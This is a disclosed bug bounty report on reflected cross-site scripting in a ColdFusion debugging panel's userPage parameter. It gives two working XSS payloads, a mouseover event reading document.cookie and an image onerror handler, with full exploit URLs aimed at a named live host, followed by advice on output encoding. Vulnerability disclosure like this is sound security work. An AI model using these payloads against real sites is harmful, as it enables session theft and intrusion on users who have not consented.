# Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm

## Report Details
- **Report ID**: 1166918
- **URL**: https://hackerone.com/reports/1166918
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-04-16T19:49:43.486Z
- **Disclosed**: 2022-06-14T10:20:47.690Z

## Reporter
- **Username**: ub3rsick
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
The ColdFusion Debugging Panel exposed at below URL.
```
http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=
```
The **userPage** parameter is not properly sanitized and is displayed  without proper output encoding. This results in reflected cross site scripting.

## Steps To Reproduce

Enter any of below payload in the **userPage** parameter and access the URL:

```
Payload 1: Mouse Over XSS
---------------------------
%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>


Payload 2: 
---------
%0d%0a</script><img+src=x+onerror=alert(document.domain)>

```

Or Just access below URLs in browser:

```
http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>

http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>

```


## Recommendations
It is highly recommended to implement output encoding.

Encode the following characters with HTML entity encoding to prevent switching into any execution context, such as script, style, or event handlers. Using hex entities is recommended in the spec. The 5 characters significant in XML ```(&, <, >, ", ')```:
```
 & --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
```

Reference: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

## Impact

XSS can be used to :
- Steal cookies, password
- Website Defacement
- Redirect Victim to Malicious site
- Log keystrokes etc.

## Attachments
- GroupLogic-CF_DBG_PANEL_XSS_01.png
- GroupLogic-CF_DBG_PANEL_XSS_02.png
- GroupLogic-CF_DBG_PANEL_XSS_03.png
- GroupLogic-CF_DBG_PANEL_XSS_04.png
